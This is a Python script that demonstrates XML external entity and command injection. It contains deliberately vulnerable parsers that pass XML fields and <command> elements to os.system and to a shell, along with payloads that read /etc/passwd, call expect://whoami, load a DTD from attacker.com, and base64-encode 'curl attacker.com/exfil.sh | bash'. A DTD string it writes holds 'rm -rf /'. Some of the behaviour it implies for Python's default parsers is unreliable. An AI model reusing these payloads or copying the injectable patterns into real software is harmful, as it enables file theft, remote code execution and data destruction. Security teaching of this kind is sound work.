#!/usr/bin/env python3

import xml.etree.ElementTree as ET
import xml.dom.minidom as minidom
from xml.sax import make_parser, ContentHandler
import subprocess
import os
import tempfile

def parse_xml_unsafe(xml_content):
    try:
        root = ET.fromstring(xml_content)
        
        result = {}
        for child in root:
            result[child.tag] = child.text
            
        print(f"Parsed XML: {result}")
        return result
    except Exception as e:
        print(f"XML parsing error: {e}")
        return None

def process_config_xml(xml_data):
    try:
        dom = minidom.parseString(xml_data)
        
        config = {}
        config_nodes = dom.getElementsByTagName('config')
        
        for node in config_nodes:
            for child in node.childNodes:
                if child.nodeType == child.ELEMENT_NODE:
                    config[child.tagName] = child.firstChild.nodeValue if child.firstChild else ""
        
        if 'backup_path' in config:
            backup_cmd = f"mkdir -p {config['backup_path']}"
            print(f"Creating backup directory: {backup_cmd}")
            os.system(backup_cmd)
        
        if 'log_command' in config:
            print(f"Executing log command: {config['log_command']}")
            subprocess.run(config['log_command'], shell=True)
        
        return config
    except Exception as e:
        print(f"Config processing error: {e}")
        return None

class VulnerableXMLHandler(ContentHandler):
    
    def __init__(self):
        self.current_element = ""
        self.data = {}
        self.commands = []
    
    def startElement(self, name, attrs):
        self.current_element = name
        if name == "command":
            pass
    
    def characters(self, content):
        if self.current_element:
            if self.current_element not in self.data:
                self.data[self.current_element] = ""
            self.data[self.current_element] += content
            
            if self.current_element == "command":
                self.commands.append(content.strip())
    
    def endDocument(self):
        for cmd in self.commands:
            if cmd:
                print(f"Executing command from XML: {cmd}")
                os.system(cmd)

def parse_with_sax(xml_content):
    try:
        parser = make_parser()
        handler = VulnerableXMLHandler()
        parser.setContentHandler(handler)
        
        from io import StringIO
        parser.parse(StringIO(xml_content))
        
        return handler.data
    except Exception as e:
        print(f"SAX parsing error: {e}")
        return None

def create_xxe_payloads():
    
    payload1 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>'''
    
    payload2 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<config>
    <backup_path>/tmp</backup_path>
    <log_command>&xxe;</log_command>
</config>'''
    
    payload3 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY cmd SYSTEM "data:text/plain;base64,Y3VybCBhdHRhY2tlci5jb20vZXhmaWwuc2ggfCBiYXNo">
]>
<root>
    <command>&cmd;</command>
</root>'''
    
    payload4 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
]>
<config>
    <setting>&xxe;</setting>
</config>'''
    
    return {
        "file_disclosure": payload1,
        "command_exec": payload2,
        "base64_command": payload3,
        "network_xxe": payload4
    }

def create_temp_dtd():
    dtd_content = '''<!ENTITY local_cmd SYSTEM "file:///etc/hostname">
<!ENTITY exec_cmd "rm -rf /">'''
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.dtd', delete=False) as f:
        f.write(dtd_content)
        return f.name

if __name__ == "__main__":
    print("=== XML External Entity (XXE) Command Injection Examples ===")
    
    payloads = create_xxe_payloads()
    
    print("Available XXE attack payloads:")
    for name in payloads.keys():
        print(f"  {name}")
    
    print("\n1. Basic XML parsing with XXE:")
    xml_input = input("Enter XML content (or payload name): ")
    
    if xml_input in payloads:
        xml_input = payloads[xml_input]
        print(f"Using payload: {xml_input[:100]}...")
    
    parse_xml_unsafe(xml_input)
    
    print("\n2. Configuration XML processing:")
    config_xml = input("Enter config XML: ")
    
    if config_xml in payloads:
        config_xml = payloads[config_xml]
    
    process_config_xml(config_xml)
    
    print("\n3. SAX parser with XXE:")
    sax_xml = input("Enter XML for SAX parsing: ")
    
    if sax_xml in payloads:
        sax_xml = payloads[sax_xml]
    
    parse_with_sax(sax_xml)
    
    print("\n=== Example Attack Payloads ===")
    
    print("\n1. File disclosure:")
    print(payloads["file_disclosure"])
    
    print("\n2. Command execution:")
    print(payloads["command_exec"])
    
    print("\n3. Base64 encoded command:")
    print(payloads["base64_command"])
    
    dtd_file = create_temp_dtd()
    print(f"\n4. Local DTD file created: {dtd_file}")
    
    local_xxe = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{dtd_file}">
]>
<root>
    <data>&xxe;</data>
</root>'''
    
    print("Local XXE payload:")
    print(local_xxe)
    
    try:
        os.unlink(dtd_file)
    except:
        pass
    
    print("\n=== Safe Alternative (for reference) ===")
    print("# Safe XML parsing would disable external entities:")
    print("# parser.setFeature(xml.sax.handler.feature_external_ges, False)")
    print("# parser.setFeature(xml.sax.handler.feature_external_pes, False)")